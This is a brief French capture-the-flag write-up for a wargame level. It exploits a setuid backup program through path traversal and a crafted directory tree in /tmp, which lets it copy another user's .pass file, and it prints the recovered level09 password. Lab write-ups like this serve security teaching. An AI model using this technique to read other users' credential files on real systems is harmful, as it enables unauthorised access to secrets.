## GET Flag

Le programme va ouvrir le fichier passé en paramètre et en faire une sauvegarde dans backup.
En se plaçant dans /tmp (où les permissions d'écriture sont présents), il est possible de créer un dossier backup.

```
~level08/level08 ../home/users/level09/.pass
ERROR: failed to open ./backups/../hom/users/level09/.pass
```
Le programme à donc réussi à lire le fichier, mais pas a le réécrire.
en créant les dossiers nécessaises, il est donc possible de créer un backup de .pass

```
mkdir -p /tmp/home/users/level09
~level08/level08 ../home/users/level09/.pass
```

### Flag

```
level09
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```
